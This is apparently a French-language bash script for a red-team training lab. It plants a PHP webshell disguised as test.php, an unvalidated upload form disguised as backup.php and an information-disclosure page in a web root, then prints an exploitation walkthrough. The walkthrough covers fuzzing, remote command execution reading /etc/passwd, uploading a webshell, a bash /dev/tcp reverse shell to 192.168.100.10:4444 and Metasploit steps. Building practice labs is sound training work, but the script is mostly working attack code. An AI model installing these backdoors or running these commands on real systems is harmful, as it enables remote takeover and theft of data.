#!/bin/bash

###############################################################################
# Iron4Software Red Team Lab - Vuln√©rabilit√©s PHP R√©alistes
# Description: Installe des vuln√©rabilit√©s cach√©es dans le webroot
# Usage: sudo ./install_realistic_vulnerabilities.sh
###############################################################################

set -e

echo "========================================================"
echo "  Iron4Software Lab - Installation R√©aliste"
echo "  Vuln√©rabilit√©s cach√©es √† la racine web"
echo "========================================================"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo "‚ùå Ce script doit √™tre ex√©cut√© en tant que root (sudo)"
    exit 1
fi

WEB_ROOT="/var/www/html"
UPLOAD_DIR="$WEB_ROOT/uploads"

echo "[1/5] Cr√©ation du r√©pertoire uploads..."
mkdir -p "$UPLOAD_DIR"
chmod 777 "$UPLOAD_DIR"
echo "‚úÖ Uploads: $UPLOAD_DIR"

echo "[2/5] Installation test.php (Webshell RCE)..."
cat > "$WEB_ROOT/test.php" << 'EOF'
<?php
// Test file - DO NOT USE IN PRODUCTION
// Debug functionality left enabled
error_reporting(E_ALL);
ini_set('display_errors', 1);

if(isset($_GET['cmd'])) {
    header('X-Debug: Enabled');
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Test</title>
    <style>
        body { font-family: monospace; background: #f0f0f0; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; }
        input[type="text"] { width: 70%; padding: 10px; }
        input[type="submit"] { padding: 10px 20px; background: #333; color: white; border: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>System Test Panel</h2>
        <p><em>Internal testing only</em></p>
        <form method="GET">
            <input type="text" name="cmd" placeholder="Command">
            <input type="submit" value="Execute">
        </form>
    </div>
</body>
</html>
EOF

chmod 644 "$WEB_ROOT/test.php"
echo "‚úÖ test.php cr√©√© (Webshell RCE cach√©)"

echo "[3/5] Installation backup.php (Upload vuln√©rable)..."
cat > "$WEB_ROOT/backup.php" << 'EOF'
<?php
// Backup utility - Upload files for backup
$upload_status = '';

if(isset($_FILES['file'])) {
    $target = "/var/www/html/uploads/" . basename($_FILES['file']['name']);
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $upload_status = "File uploaded: /uploads/" . basename($_FILES['file']['name']);
    } else {
        $upload_status = "Upload failed";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Backup Utility</title>
    <style>
        body { font-family: Arial; background: #e9ecef; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 5px; }
        h2 { color: #333; }
        .status { padding: 10px; background: #d4edda; border-radius: 3px; margin: 15px 0; }
        input[type="file"] { padding: 10px; }
        input[type="submit"] { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>üì¶ Backup Utility</h2>
        <p>Upload files for system backup</p>
        
        <?php if($upload_status): ?>
        <div class="status"><?php echo $upload_status; ?></div>
        <?php endif; ?>
        
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <input type="submit" value="Upload">
        </form>
        
        <p style="margin-top: 20px; font-size: 0.9em; color: #666;">
            <em>Note: Files are stored in /uploads/ directory</em>
        </p>
    </div>
</body>
</html>
EOF

chmod 644 "$WEB_ROOT/backup.php"
echo "‚úÖ backup.php cr√©√© (Upload sans validation)"

echo "[4/5] Installation check.php (Info disclosure)..."
cat > "$WEB_ROOT/check.php" << 'EOF'
<?php
// System health check
header('X-Powered-By: PHP/' . phpversion());
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Check</title>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
        .info { background: #2d2d2d; padding: 15px; margin: 10px 0; border-left: 3px solid #00ff00; }
    </style>
</head>
<body>
    <h1>üîß System Health Check</h1>
    
    <div class="info">
        <strong>PHP Version:</strong> <?php echo phpversion(); ?>
    </div>
    
    <div class="info">
        <strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?>
    </div>
    
    <div class="info">
        <strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
    </div>
    
    <div class="info">
        <strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?>
    </div>
    
    <div class="info">
        <strong>PHP User:</strong> <?php echo get_current_user(); ?>
    </div>
    
    <h2>System Status: ‚úÖ Operational</h2>
</body>
</html>
EOF

chmod 644 "$WEB_ROOT/check.php"
echo "‚úÖ check.php cr√©√© (Info disclosure)"

echo "[5/5] Nettoyage du dossier /lab/ si existant..."
if [ -d "$WEB_ROOT/lab" ]; then
    rm -rf "$WEB_ROOT/lab"
    echo "‚úÖ Dossier /lab/ supprim√©"
fi

chown -R www-data:www-data "$WEB_ROOT"
echo "‚úÖ Permissions configur√©es"

SERVER_IP=$(hostname -I | awk '{print $1}')
HOSTNAME=$(hostname)

echo ""
echo "========================================================"
echo "  ‚úÖ Installation r√©aliste termin√©e !"
echo "========================================================"
echo ""
echo "üìä Configuration :"
echo "   Hostname  : $HOSTNAME"
echo "   IP        : $SERVER_IP"
echo "   Web Root  : $WEB_ROOT"
echo ""
echo "üéØ Vuln√©rabilit√©s install√©es (noms r√©alistes) :"
echo "   1. test.php    - Webshell RCE (fichier de test oubli√©)"
echo "   2. backup.php  - Upload non s√©curis√© (utilitaire backup)"
echo "   3. check.php   - Info disclosure (health check)"
echo "   4. /uploads/   - R√©pertoire d'upload accessible"
echo ""
echo "üîç D√©couverte (Fuzzing requis) :"
echo "   gobuster dir -u http://$SERVER_IP/ -w wordlist.txt"
echo "   dirbuster, dirb, ffuf..."
echo ""
echo "üß™ Tests locaux :"
echo "   curl http://localhost/test.php"
echo "   curl 'http://localhost/test.php?cmd=id'"
echo "   curl http://localhost/backup.php"
echo "   curl http://localhost/check.php"
echo ""
echo "========================================================"
echo "  üî• EXPLOITATION DEPUIS KALI"
echo "========================================================"
echo ""
echo "1Ô∏è‚É£  Fuzzing / D√©couverte :"
echo "    gobuster dir -u http://mail.iron4software.local/ -w /usr/share/wordlists/dirb/common.txt"
echo "    # Trouve: test.php, backup.php, check.php"
echo ""
echo "2Ô∏è‚É£  Reconnaissance :"
echo "    curl http://mail.iron4software.local/check.php"
echo "    # Info: PHP version, serveur, user"
echo ""
echo "3Ô∏è‚É£  Exploitation RCE (test.php) :"
echo "    curl 'http://mail.iron4software.local/test.php?cmd=whoami'"
echo "    curl 'http://mail.iron4software.local/test.php?cmd=id'"
echo "    curl 'http://mail.iron4software.local/test.php?cmd=cat%20/etc/passwd'"
echo ""
echo "4Ô∏è‚É£  Upload webshell (backup.php) :"
echo "    echo '<?php system(\$_GET[\"x\"]); ?>' > shell.php"
echo "    curl -F 'file=@shell.php' http://mail.iron4software.local/backup.php"
echo "    curl 'http://mail.iron4software.local/uploads/shell.php?x=id'"
echo ""
echo "5Ô∏è‚É£  Reverse shell :"
echo "    # Sur Kali: nc -lvnp 4444"
echo "    curl 'http://mail.iron4software.local/test.php?cmd=bash%20-c%20\"bash%20-i%20>%26%20/dev/tcp/192.168.100.10/4444%200>%261\"'"
echo ""
echo "6Ô∏è‚É£  Metasploit (PHP-FPM RCE) :"
echo "    msfconsole -q"
echo "    use exploit/multi/http/php_fpm_rce"
echo "    set RHOSTS mail.iron4software.local"
echo "    set LHOST 192.168.100.10"
echo "    set LPORT 4444"
echo "    check"
echo "    exploit"
echo ""
echo "========================================================"
echo "  üõ°Ô∏è Lab Iron4Software - Configuration R√©aliste"
echo "========================================================"
